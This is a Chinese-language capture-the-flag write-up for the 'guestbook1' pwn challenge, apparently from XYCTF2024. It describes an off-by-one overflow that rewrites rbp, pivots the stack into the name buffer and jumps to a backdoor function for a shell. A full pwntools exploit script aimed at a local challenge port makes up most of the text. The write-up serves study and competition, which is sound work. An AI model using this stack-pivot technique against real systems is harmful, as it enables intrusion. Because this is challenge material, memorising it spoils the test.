# guestbook1

> 分类：Pwn

## 题目描述
id 的最后一位有溢出，能修改 rbp 变为更小的地址，溢出后两次 return 会造成栈迁移，让 return 落到 name 段，随后通过 backdoor 来 getshell。

## 考察知识点
- 栈溢出
- rbp 篡改 / 栈迁移
- backdoor

## 解法
id 的最后一位溢出修改 rbp，溢出后两次 return 造成栈迁移，落到 name 段，通过 backdoor getshell。

```python
from pwn import *
import os

os.chdir('./bin')
#sh = process('./pwn')
sh = remote('127.0.0.1',11032)
elf = ELF('./pwn')

backdoor = 0x0401323

for i in range(33):
    sh.recvuntil(b'index\n')
    sh.sendline(str(i).encode())
    sh.recvuntil(b'name:\n')
    sh.send(p64(backdoor)*2)
    sh.recvuntil(b'id:\n')
    sh.sendline(b'8')

sh.recvuntil(b'index\n')
sh.sendline(b'-1')

sh.interactive()
```

## 参考答案
（未给出，getshell 后读取）

## 来源
- 作者：jht3 | https://jht3qaq.github.io/2024/04/26/XYCTF2024-Writeup/
